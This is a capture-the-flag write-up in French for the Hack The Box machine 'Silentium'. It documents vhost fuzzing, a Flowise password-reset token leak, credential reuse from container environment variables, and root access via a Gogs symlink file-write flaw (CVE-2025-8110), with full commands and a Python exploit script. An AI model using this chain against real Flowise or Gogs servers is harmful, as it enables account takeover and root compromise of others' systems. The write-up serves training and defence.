# Hack The Box: Writeup Silentium

<p align="center">
  <img src="https://img.shields.io/badge/HTB-Silentium-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Attack-Broken%20Access%20Control-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Privilege%20Escalation-CVE--2025--8110-important?style=for-the-badge">
</p>

<p align="center">
  <a href="https://app.hackthebox.com/machines/Silentium">app.hackthebox.com/machines/Silentium</a>
</p>

---

## 📚 Table des matières

* [Aperçu](#-aperçu)
* [Reconnaissance](#-reconnaissance)

  * [Scan de ports](#scan-de-ports)
  * [Énumération HTTP](#énumération-http)
  * [Énumération des vhosts](#énumération-des-vhosts)
* [Accès initial](#-accès-initial)

  * [Identification de Flowise](#identification-de-flowise)
  * [Énumération des utilisateurs](#énumération-des-utilisateurs)
  * [Réinitialisation de mot de passe non authentifiée](#réinitialisation-de-mot-de-passe-non-authentifiée)
  * [Fuite des variables d'environnement du conteneur](#fuite-des-variables-denvironnement-du-conteneur)
  * [Connexion SSH](#connexion-ssh)
  * [Flag utilisateur](#flag-utilisateur)
* [Élévation de privilèges](#-élévation-de-privilèges)

  * [Énumération de Gogs](#énumération-de-gogs)
  * [CVE-2025-8110: Écriture arbitraire de fichier via symlink](#cve-2025-8110--écriture-arbitraire-de-fichier-via-symlink)
  * [Accès root](#accès-root)
  * [Flag root](#flag-root)
* [Pistes explorées et abandonnées](#-pistes-explorées-et-abandonnées)
* [Conclusion](#-conclusion)
* [Outils utilisés](#-outils-utilisés)
* [Points clés à retenir](#-points-clés-à-retenir)

---

## 🎯 Aperçu

| Machine   | OS    | Difficulté |
| --------- | ----- | ---------- |
| Silentium | Linux | Easy       |

### Description

Cette machine illustre :

* le fuzzing de vhosts pour découvrir des services internes non liés depuis la page publique,
* une vulnérabilité de logique métier dans un flux de réinitialisation de mot de passe (fuite de jeton dans la réponse HTTP),
* la récupération de secrets applicatifs via les variables d'environnement d'un conteneur Docker,
* l'exploitation de **CVE-2025-8110**, une vulnérabilité d'écriture arbitraire de fichier par symlink dans l'API REST de Gogs ≤ 0.13.3, permettant une élévation de privilèges jusqu'à root lorsque le service tourne sous cet utilisateur.

---

## 🔎 Reconnaissance

### Scan de ports

```bash
nmap -Pn -p- --min-rate 5000 10.129.26.101 -oN nmap-allports.txt
```

#### Résultat

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Scan de version et de scripts par défaut sur les ports ouverts :

```bash
nmap -Pn -sCV -p22,80 10.129.26.101 -oN nmap-scv.txt
```

#### Résultat

```text
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-title: Did not follow redirect to http://silentium.htb/
```

#### Observations

* Deux services exposés : SSH et un reverse proxy nginx.
* Le port 80 redirige vers le nom d'hôte virtuel `silentium.htb`, qu'il faut ajouter à `/etc/hosts`.

---

### Énumération HTTP

```bash
echo "10.129.26.101 silentium.htb" | sudo tee -a /etc/hosts
curl -s http://silentium.htb/ -o index.html
```

Le site présente une page vitrine institutionnelle (« Silentium | Institutional Capital & Lending Solutions ») construite avec Tailwind CSS, sans logique métier côté client exploitable dans `/assets/app.js` ou `/assets/styles.css`.

#### Observations

* La page « équipe » liste plusieurs employés, dont un dénommé **Ben**, *Head of Financial Systems*: une piste sérieuse pour un nom d'utilisateur (`ben`).
* Aucune route API ni secret dans les bundles JS statiques.

---

### Énumération des vhosts

```bash
ffuf -u http://10.129.26.101/ \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.silentium.htb" -fs 178
```

#### Résultat

```text
staging                [Status: 200, Size: 4211]
```

Le sous-domaine `staging.silentium.htb` répond avec un contenu distinct de la page principale.

```bash
echo "10.129.26.101 staging.silentium.htb" | sudo tee -a /etc/hosts
curl -s http://staging.silentium.htb/ | grep -i title
```

```text
<title>Flowise - Build AI Agents, Visually</title>
```

Un second vhost sera découvert plus tard, lors de l'énumération post-exploitation (`staging-v2-code.dev.silentium.htb`), hébergeant une instance Gogs.

---

## 🚀 Accès initial

### Identification de Flowise

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

[Flowise](https://github.com/FlowiseAI/Flowise) 3.0.5 est en place. Les routes protégées (`/api/v1/chatflows`) renvoient un `401 Unauthorized Access`, il faut donc trouver un moyen d'obtenir des identifiants valides.

---

### Énumération des utilisateurs

La route de connexion `POST /api/v1/auth/login` renvoie un message d'erreur différent selon qu'un compte existe ou non, ce qui permet une énumération d'utilisateurs :

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"x"}'
```

| Email                     | Réponse                        |
| ------------------------- | ------------------------------- |
| `admin@silentium.htb`     | `User Not Found`                |
| `ben@silentium.htb`       | `Incorrect Email or Password`   |
| `marcus@silentium.htb`    | `User Not Found`                |
| `elena@silentium.htb`     | `User Not Found`                |

Le compte `ben@silentium.htb` existe bel et bien dans Flowise.

---

### Réinitialisation de mot de passe non authentifiée

La route `POST /api/v1/account/forgot-password` accepte n'importe quel email et renvoie l'objet utilisateur complet, y compris le jeton temporaire de réinitialisation, directement dans le corps de la réponse HTTP: sans jamais transiter par une boîte mail :

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

#### Résultat (extrait)

```json
{
  "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
  "name": "admin",
  "email": "ben@silentium.htb",
  "tempToken": "<jeton_de_reinitialisation>",
  "tokenExpiry": "..."
}
```

Ce comportement est une faille de logique métier : le `tempToken` censé être envoyé uniquement par email est directement exposé dans la réponse API, permettant de réinitialiser le mot de passe de n'importe quel compte sans accès à sa messagerie :

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"tempToken":"<jeton_de_reinitialisation>","password":"SilentiumReset123!"}'
```

Connexion à l'interface Flowise avec `ben@silentium.htb:SilentiumReset123!` réussie.

---

### Fuite des variables d'environnement du conteneur

Une fois authentifié sur Flowise, l'exécution de code obtenue via l'application (contexte du conteneur Docker Flowise, et non de l'hôte) permet de lire les variables d'environnement du processus :

```bash
env
```

#### Résultat (extrait)

```text
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
SENDER_EMAIL=ben@silentium.htb
```

Le conteneur Flowise ne contient pas `/root/root.txt` ni `/home/*/user.txt` : ce n'est pas l'hôte final, mais les secrets qu'il expose sont réutilisables ailleurs.

---

### Connexion SSH

```bash
ssh ben@10.129.26.101
# Password: F1l3_d0ck3r  → échec
```

```bash
ssh ben@10.129.26.101
# Password: r04D!!_R4ge  → succès
```

Le mot de passe SMTP divulgué par le conteneur (`r04D!!_R4ge`) est en réalité réutilisé pour le compte SSH `ben` sur l'hôte.

---

### Flag utilisateur

```bash
cat /home/ben/user.txt
```

#### Résultat

```text
b9ae************************1cb4
```

---

## 🔺 Élévation de privilèges

### Énumération de Gogs

```bash
sudo -l
```

```text
Sorry, user ben may not run sudo on silentium.
```

L'hôte expose des services internes en local uniquement :

```bash
ss -tlnp
```

```text
127.0.0.1:3000   → Flowise (conteneur)
127.0.0.1:3001   → service inconnu
```

```bash
curl -s http://127.0.0.1:3001/ | grep -i title
```

```text
<title>Gogs</title>
```

La configuration Gogs (`/opt/gogs/gogs/custom/conf/app.ini`, lisible par `ben`) révèle un détail critique :

```ini
RUN_USER = root
[server]
DOMAIN = staging-v2-code.dev.silentium.htb
```

**Gogs 0.13.3 tourne directement sous l'utilisateur `root` sur l'hôte**: toute primitive d'écriture de fichier obtenue via l'application se traduit directement par une compromission root.

---

### CVE-2025-8110: Écriture arbitraire de fichier via symlink

[**CVE-2025-8110**](https://nvd.nist.gov/vuln/detail/CVE-2025-8110) affecte Gogs ≤ 0.13.3 : l'endpoint `PUT /api/v1/repos/:owner/:repo/contents/:path` (API *PutContents*) valide l'absence de séquences de traversée de répertoire (`../`) dans le chemin cible, mais ne résout jamais les liens symboliques avant d'écrire le contenu. Un attaquant authentifié peut donc committer un symlink pointant vers n'importe quel fichier du système, puis utiliser l'API pour écrire au travers de ce lien. Combiné à un service Gogs exécuté en `root`, cela offre une primitive d'écriture arbitraire avec les privilèges root.

Référence technique : [3jee/CVE-2025-8110](https://github.com/3jee/CVE-2025-8110)

#### 1. Création d'un compte Gogs

L'inscription publique est active mais protégée par un captcha numérique à 6 chiffres, résolu visuellement :

```text
http://staging-v2-code.dev.silentium.htb/user/sign_up
```

Compte créé : `hacker:Hacker123!`

#### 2. Création d'un dépôt et d'un jeton API

```text
http://staging-v2-code.dev.silentium.htb/repo/create   → dépôt "pwn"
http://staging-v2-code.dev.silentium.htb/user/settings/applications → génération d'un jeton API
```

#### 3. Création du symlink malveillant

```bash
git clone http://hacker:Hacker123!@staging-v2-code.dev.silentium.htb/hacker/pwn /tmp/pwn_exploit
cd /tmp/pwn_exploit
ln -s /root/.ssh/authorized_keys authorized_keys
git add authorized_keys
git commit -m "add authorized_keys symlink"
git push http://hacker:Hacker123!@staging-v2-code.dev.silentium.htb/hacker/pwn master
```

#### 4. Génération d'une paire de clés SSH

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/root_key -N ''
```

#### 5. Écriture de la clé publique au travers du symlink

```python
import requests, base64

TOKEN = "<jeton_api_gogs>"
BASE = "http://staging-v2-code.dev.silentium.htb"
headers = {"Authorization": f"token {TOKEN}", "Content-Type": "application/json"}

pubkey = open("/tmp/root_key.pub").read().strip()
pubkey_b64 = base64.b64encode((pubkey + "\n").encode()).decode()

r = requests.get(f"{BASE}/api/v1/repos/hacker/pwn/contents/authorized_keys", headers=headers)
sha = r.json()["sha"]

requests.put(
    f"{BASE}/api/v1/repos/hacker/pwn/contents/authorized_keys",
    headers=headers,
    json={"message": "write ssh key", "content": pubkey_b64, "sha": sha},
)
```

Gogs, exécuté en `root`, suit le symlink et écrit la clé publique attaquant dans `/root/.ssh/authorized_keys`.

---

### Accès root

```bash
ssh -i /tmp/root_key root@127.0.0.1
```

```text
Welcome to Ubuntu 24.04 LTS
root@silentium:~#
```

---

### Flag root

```bash
cat /root/root.txt
```

#### Résultat

```text
5bc5************************a14f2
```

---

## 🧭 Pistes explorées et abandonnées

Par souci de transparence méthodologique, ces pistes ont été testées puis écartées :

* **CVE-2025-59528** (RCE via `customMCP` dans Flowise) : l'endpoint `/api/v1/node-load-method/customMCP` renvoie systématiquement `401` même avec une session valide sur cette instance ; le vecteur reste théoriquement valide mais inexploitable dans cette configuration multi-tenant.
* **CVE-2024-39930** (injection d'argument via les tags de release Gogs) : corrigée dans la version 0.13.3 installée sur la machine.
* Lecture directe de la base SQLite de Gogs (`/opt/gogs/data/gogs.db`) : fichier appartenant à un UID dédié, non lisible par `ben`.

---

## 🧠 Conclusion

Cette chaîne d'attaque combine plusieurs classes de vulnérabilités représentatives d'environnements réels :

1. Découverte d'un service interne (Flowise) par fuzzing de vhosts.
2. Contournement de l'authentification via une faille de logique métier dans le flux de réinitialisation de mot de passe (fuite de jeton).
3. Récupération de secrets applicatifs par lecture des variables d'environnement d'un conteneur Docker.
4. Réutilisation de mot de passe entre un service interne et un compte système.
5. Élévation de privilèges jusqu'à root via **CVE-2025-8110**, une vulnérabilité d'écriture arbitraire de fichier par symlink dans Gogs, aggravée par une configuration exécutant le service en `root`.

---

## 🛠️ Outils utilisés

* Nmap
* ffuf
* curl
* Python (`requests`)
* Git
* OpenSSH

---

## 📌 Points clés à retenir

* Toujours fuzzer les vhosts, pas uniquement les répertoires : les services internes sont souvent exposés sur des sous-domaines non liés depuis le site public.
* Un flux de réinitialisation de mot de passe ne doit jamais renvoyer le jeton de réinitialisation dans la réponse HTTP: il doit transiter exclusivement par un canal hors-bande (email, SMS).
* Les variables d'environnement d'un conteneur applicatif contiennent fréquemment des secrets réutilisés ailleurs sur l'infrastructure ; leur exposition via une RCE applicative a un impact qui dépasse le périmètre du conteneur.
* Ne jamais exécuter un service auto-hébergé exposé (Gogs, Gitea, etc.) sous l'utilisateur `root` : une vulnérabilité applicative se traduit alors immédiatement en compromission système complète.
* Une API qui écrit des fichiers à partir d'un chemin fourni par l'utilisateur doit toujours résoudre (et rejeter) les liens symboliques avant d'effectuer l'écriture.

---

*Writeup rédigé par Jean-Michel Leclercq: machine résolue le 2026-07-03.*
